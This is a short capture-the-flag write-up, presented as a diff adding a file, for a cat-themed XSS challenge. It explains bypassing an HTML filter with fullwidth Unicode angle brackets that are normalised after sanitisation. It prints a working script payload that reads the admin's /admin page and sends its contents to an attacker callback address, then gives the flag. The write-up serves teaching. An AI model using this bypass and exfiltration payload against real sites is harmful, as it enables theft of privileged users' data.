@@ -1,0 +1,22 @@
+There were lots of cats, cat pictures, UNICODE cats, even more UNICODE cats, the title was even cat emojis!
+
+The website was quite simple, submit your cats with HTML tags! Obviously knowing that an admin was going to check each submission and you needed to reach /admin some XSS was the way to go.
+
+The intended way to solve it was to take advantage of a common problem, normalization after sanitation (it turns out there were other issues you could take advantage of, but whatever). Using a unicode less then or greater than (for example U+FF1E ＞) you could bypass the filtering.
+
+After you figured out that, a payload was needed to make the admin request the /admin page, then send the flag back out to you. Here's an example: 
+
+<script＞
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+    xhr.open('GET', 'http://YOURCALLBACKIP?result=' + this.responseText);
+    xhr.send()
+  }
+};
+xhr.open('GET', 'http://127.0.0.1:3000/admin');
+xhr.send()
+</script＞
+
+Then you'd be presented with the flag:
+RC3{un1c0de_s3cur1ty_is_s0_3asy!}
